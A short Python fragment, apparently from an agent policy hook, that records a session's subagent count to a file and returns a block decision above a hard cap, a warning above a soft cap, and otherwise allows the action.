    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(str(count), encoding="utf-8")
    if count > hard:
        return Decision(True, f"blocked: subagent budget exceeded ({count} > hard cap {hard})")
    if count > soft:
        return Decision(False, f"warning: {count} subagents this session (soft cap {soft})")
    return ALLOW
